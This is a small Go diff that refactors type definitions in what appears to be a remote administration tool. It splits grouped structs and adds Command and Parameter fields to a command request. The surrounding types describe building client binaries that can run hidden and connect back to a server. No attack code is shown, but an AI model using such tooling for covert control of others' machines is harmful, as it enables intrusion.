@@ -6,21 +6,22 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
 )
 
-type (
-	SendCommandInput struct {
-		ClientID string
-		Request  string
-	}
-	SendCommandOutput struct {
-		Response string
-	}
+type SendCommandInput struct {
+	ClientID  string
+	Command   string
+	Parameter string
+	Request   string
+}
 
-	BuildClientBinaryInput struct {
-		ServerAddress, ServerPort, Filename string
-		RunHidden                           bool
-		OSTarget                            system.OSType
-	}
-)
+type SendCommandOutput struct {
+	Response string
+}
+
+type BuildClientBinaryInput struct {
+	ServerAddress, ServerPort, Filename string
+	RunHidden                           bool
+	OSTarget                            system.OSType
+}
 
 type Service interface {
 	AddConnection(clientID string, connection *websocket.Conn) error
